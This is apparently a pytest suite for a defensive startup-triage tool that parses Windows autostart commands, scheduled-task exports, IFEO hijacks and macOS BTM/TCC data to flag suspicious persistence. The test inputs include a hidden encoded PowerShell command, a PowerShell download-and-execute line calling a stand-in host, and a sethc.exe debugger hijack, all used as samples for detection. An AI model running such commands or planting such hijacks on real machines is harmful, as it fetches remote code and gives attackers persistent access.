"""What starts automatically: command parsing, unquoted paths, Task Manager's switch, scheduled-task export,
judging (fingerprints, unsigned programs in user folders, hijacks, hidden PowerShell), BTM and TCC readers.
Nothing may touch the network."""
import hashlib
import os
import plistlib
import socket
import sqlite3
import struct
import sys
import tempfile

import pytest

from zbtriage import startup as su
from zbtriage.iocs import Indicator, IocSet


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("the startup check must never touch the network")
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)


WIN = sys.platform == "win32"


def test_program_of_quoted_and_unquoted_commands():
    assert su.su_program('"C:\\Program Files\\App\\app.exe" --tray')[0] == "C:\\Program Files\\App\\app.exe"
    assert su.su_program("C:\\Tools\\agent.exe -s")[0] == "C:\\Tools\\agent.exe"
    assert su.su_program("C:\\Program Files\\App\\app.exe /min")[0] == "C:\\Program Files\\App\\app.exe"


def test_program_of_script_hosts_names_the_script():
    prog, given = su.su_program('powershell.exe -NoProfile -File "C:\\Users\\x\\a b\\run.ps1"')
    assert given == "C:\\Users\\x\\a b\\run.ps1"
    assert su.su_program('wscript.exe //B "C:\\Users\\x\\s.vbs"')[1] == "C:\\Users\\x\\s.vbs"
    assert su.su_program("rundll32.exe C:\\Users\\x\\evil.dll,Start")[1] == "C:\\Users\\x\\evil.dll"
    assert su.su_program('cmd.exe /c "C:\\Users\\x\\go.bat"')[1] == "C:\\Users\\x\\go.bat"


@pytest.mark.skipif(not WIN, reason="System32 resolution is Windows behaviour")
def test_bare_dll_given_to_rundll32_is_the_system32_copy():
    given = su.su_program("rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask")[1]
    assert given.lower().endswith(os.path.join("system32", "sysmain.dll"))


def test_unquoted_path_with_a_space():
    real = "C:\\Users\\u\\Desktop\\porto rafti\\monitor.bat"
    exists = lambda p: p == real  # noqa: E731
    assert su.su_unquoted('"C:\\Users\\u\\Desktop\\porto" rafti\\monitor.bat', exists) == (real, True)
    gone = su.su_unquoted('"C:\\Users\\u\\Desktop\\porto" rafti\\monitor.bat', lambda p: False)
    assert gone == ("C:\\Users\\u\\Desktop\\porto rafti\\monitor.bat", False)
    assert su.su_unquoted('"C:\\ok\\app.exe" --flag', lambda p: p == "C:\\ok\\app.exe") == ("", False)
    # a properly set-up program that was uninstalled is not an unquoted path
    assert su.su_unquoted('"C:\\Program Files\\Disk\\Disk64.exe" /Startup', lambda p: False) == ("", False)


def test_task_manager_switch():
    assert su.su_approved_on(b"\x02\x00\x00\x00") and su.su_approved_on(b"\x06\x00")
    assert not su.su_approved_on(b"\x03\x00\x00\x00") and not su.su_approved_on(b"\x01\x00")


def test_batch_file_first_command():
    raw = b"@echo off\r\nrem comment\r\n:: also\r\ntitle x\r\npowershell -File \"C:\\Users\\u\\a.ps1\"\r\nexit\r\n"
    assert su.su_batch_command(raw).startswith("powershell -File")


def test_shortcut_fallback_finds_the_program():
    raw = b"L\x00\x00\x00junk" + "C:\\Users\\u\\AppData\\Roaming\\App\\App.exe".encode("utf-16-le") + b"\x00\x00"
    assert su.su_lnk_fallback(raw) == "C:\\Users\\u\\AppData\\Roaming\\App\\App.exe"


SCHTASKS = """<?xml version="1.0" encoding="UTF-16"?>
<Tasks>
  <!-- \\Updater -->
  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <Settings><Enabled>false</Enabled></Settings>
    <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
    <Actions Context="Author"><Exec><Command>C:\\Users\\u\\up.exe</Command><Arguments>-q</Arguments></Exec></Actions>
  </Task>
  <!-- \\Microsoft\\Windows\\Thing -->
  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <Actions Context="Author"><Exec><Command>%windir%\\system32\\thing.exe</Command></Exec>
      <ComHandler><ClassId>{0000}</ClassId></ComHandler></Actions>
  </Task>
</Tasks>"""


def test_scheduled_task_export_is_parsed_with_task_level_switch():
    tasks = su.su_tasks_from_xml(SCHTASKS)
    assert tasks[0] == ("Updater", '"C:\\Users\\u\\up.exe" -q', False)
    assert tasks[1][0] == "Microsoft\\Windows\\Thing" and tasks[1][2] is True


def test_scheduled_task_export_refuses_a_dtd():
    assert su.su_tasks_from_xml("<!-- \\x --><!DOCTYPE x [<!ENTITY a 'b'>]><Task><Actions/></Task>") == []


def _fake(signature="signed", there=True):
    return dict(sign=lambda p: signature, hashes=lambda p: (hashlib.sha256(p.encode()).hexdigest(), ""),
                exists=lambda p: there)


def test_fingerprint_match_is_known_threat():
    target = os.path.join(tempfile.gettempdir(), "helper.exe")
    digest = hashlib.sha256(target.encode()).hexdigest()
    iocs = IocSet([Indicator(digest, "file", "primary", "sha256", "amnesty-test", "Predator")], "t", 0)
    level, entries = su.su_judge([su.su_entry("Run key (this user)", "helper", target)], iocs, **_fake())
    assert level == su.SU_KNOWN and entries[0]["indicator"]["family"] == "Predator"


def test_unsigned_program_in_a_user_folder_is_worth_a_look_and_signed_is_not():
    target = os.path.join(os.path.expanduser("~"), "AppData", "x", "agent.exe")
    level, entries = su.su_judge([su.su_entry("Run key (this user)", "agent", target)], None, **_fake("not-signed"))
    assert level == su.SU_LOOK and "unsigned program" in entries[0]["reasons"][0]
    level, _e = su.su_judge([su.su_entry("Run key (this user)", "agent", target)], None, **_fake("signed"))
    assert level == su.SU_NOTHING


def test_switched_off_entries_do_not_raise_the_level():
    target = os.path.join(os.path.expanduser("~"), "x", "agent.exe")
    level, entries = su.su_judge([su.su_entry("Run key (this user)", "a", target, enabled=False)], None,
                                 **_fake("not-signed"))
    assert level == su.SU_NOTHING and entries[0]["reasons"]


def test_hidden_powershell_and_downloader():
    enc = "powershell.exe -w hidden -enc " + "A" * 60
    level, entries = su.su_judge([su.su_entry("scheduled task", "x", enc, kind="task")], None, **_fake())
    assert level == su.SU_LOOK and "encoded" in entries[0]["reasons"][0]
    dl = "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"
    _l, entries = su.su_judge([su.su_entry("scheduled task", "y", dl, kind="task")], None, **_fake())
    assert any("downloads" in r for r in entries[0]["reasons"])


def test_hijack_and_remote_access_program():
    entries = [su.su_entry("debugger hijack (IFEO)", "sethc.exe", "C:\\Windows\\System32\\cmd.exe", kind="hijack",
                           note="whenever sethc.exe is started, Windows starts this instead"),
               su.su_entry("Run key (all users)", "AnyDesk", "C:\\Program Files\\AnyDesk\\AnyDesk.exe")]
    level, entries = su.su_judge(entries, None, **_fake())
    assert level == su.SU_LOOK
    assert "instead" in entries[0]["reasons"][0] and "AnyDesk" in entries[1]["reasons"][0]


def test_missing_absolute_program_in_user_folder_is_noted():
    target = os.path.join(os.path.expanduser("~"), "gone", "old.exe")
    _l, entries = su.su_judge([su.su_entry("Run key (this user)", "old", target)], None, **_fake(there=False))
    assert "not there" in entries[0]["reasons"][0]


def test_btm_store_items():
    data = {"$objects": ["$null", "file:///Applications/Spy%20Helper.app/", "/Applications/Zoom.us.app",
                         "/System/Library/Thing.app", "com.example.agent", 5]}
    items = su.su_btm_items(data)
    assert "/Applications/Zoom.us.app" in items and not any(i.startswith("/System/") for i in items)


def test_tcc_database_grants(tmp_path):
    db = tmp_path / "TCC.db"
    con = sqlite3.connect(str(db))
    con.execute("CREATE TABLE access (service TEXT, client TEXT, client_type INT, auth_value INT)")
    con.executemany("INSERT INTO access VALUES (?,?,?,?)", [
        ("kTCCServiceScreenCapture", "com.teamviewer.TeamViewer", 0, 2),
        ("kTCCServiceMicrophone", "us.zoom.xos", 0, 2),
        ("kTCCServiceCamera", "com.denied.app", 0, 0)])
    con.commit()
    con.close()
    grants, gaps = su.su_tcc([str(db)])
    assert {g["client"] for g in grants} == {"com.teamviewer.TeamViewer", "us.zoom.xos"} and not gaps
    assert su._su_grants_level(grants, su.SU_NOTHING) == su.SU_LOOK
    assert "TeamViewer" in [g for g in grants if g["reasons"]][0]["reasons"][0]


def test_render_lists_and_hides_signed_system_parts():
    entries = [su.su_entry("Run key (this user)", "App", "C:\\Program Files\\App\\app.exe"),
               su.su_entry("service", "Spooler", os.path.join(os.environ.get("SystemRoot", "C:\\Windows"),
                                                               "System32", "spoolsv.exe"), kind="service")]
    level, entries = su.su_judge(entries, None, **_fake())
    text = su.su_render({"level": level, "entries": entries, "grants": [], "gaps": ["x"], "platform": "win32"})
    assert "App" in text and "NOT READ" in text and "nothing was contacted" in text
    if WIN:
        assert "Spooler" not in text
        full = su.su_render({"level": level, "entries": entries, "grants": [], "gaps": [], "platform": "win32"},
                            show_all=True)
        assert "Spooler" in full


@pytest.mark.skipif(not WIN, reason="reads this Windows computer")
def test_real_inventory_runs_and_finds_tasks_and_services():
    result = su.su_inventory(None)
    kinds = {e["kind"] for e in result["entries"]}
    assert {"service", "task"} <= kinds


# --- entry points --------------------------------------------------------------------------------------------
from test_followup_fixes import bundle  # noqa: E402,F401  (pytest fixture)


def test_bundle_runs_the_startup_list_not_a_scan(bundle, capsys, monkeypatch):
    monkeypatch.setattr(bundle, "reader_run", lambda *a, **k: pytest.fail("a computer scan must not start"),
                        raising=False)
    monkeypatch.setattr(bundle, "su_inventory", lambda iocs=None: {"level": "nothing-known", "entries": [],
                                                                   "grants": [], "gaps": [], "platform": "win32"})
    assert bundle._bundle_main(["--no-menu", "--no-banner", "--no-feeds", "--startup"]) == 0
    assert "WHAT STARTS AUTOMATICALLY" in capsys.readouterr().out


def test_startup_is_a_stand_alone_check():
    from zbtriage import cli
    with pytest.raises(SystemExit):
        cli._parse(["--startup", "--check-link", "http://x.example"])
